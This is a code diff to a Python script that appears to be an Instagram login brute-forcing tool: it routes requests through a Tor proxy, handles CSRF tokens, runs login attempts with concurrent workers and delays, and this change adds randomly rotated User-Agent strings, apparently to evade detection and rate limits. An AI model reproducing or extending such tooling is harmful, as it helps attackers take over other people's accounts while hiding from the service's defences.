@@ -19,13 +19,23 @@ def setup_tor_proxy():
     }
     return session
 
+# Generate random User-Agent
+def generate_user_agent():
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+    ]
+    return random.choice(user_agents)
+
 # Instagram login function with CSRF token handling
 def instagram_login(username, password, session):
     login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
     # Fetch CSRF token by sending a GET request
-    session.get('https://www.instagram.com/accounts/login/')
-    csrf_token = session.cookies.get('csrftoken')
+    response = session.get('https://www.instagram.com/accounts/login/', headers={'User-Agent': generate_user_agent()})
+    csrf_token = response.cookies.get('csrftoken')
 
     if not csrf_token:
         print(Fore.RED + "[-] Could not retrieve CSRF token.")
@@ -41,7 +51,7 @@ def instagram_login(username, password, session):
     }
 
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'User-Agent': generate_user_agent(),
         'X-Requested-With': 'XMLHttpRequest',
         'Referer': 'https://www.instagram.com/accounts/login/',
         'x-csrftoken': csrf_token
@@ -109,5 +119,4 @@ def main():
             test_speed(username, password, delay, max_workers)
 
 if __name__ == "__main__":
-    main()
-    
+    main() 
